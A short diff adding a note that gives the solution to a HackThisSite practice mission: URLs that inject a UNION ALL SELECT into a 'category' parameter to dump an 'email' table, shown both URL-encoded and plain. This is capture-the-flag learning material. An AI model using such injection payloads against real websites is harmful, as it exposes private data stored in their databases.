@@ -1,0 +1,7 @@
+SQL INJECTION example:
+	
+	https://www.hackthissite.org/missions/realistic/4/products.php?category=1
+
+	https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20null,%20*,%20null,%20null%20FROM%20email;
+
+	~~		https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT null, *, null, null FROM email; 
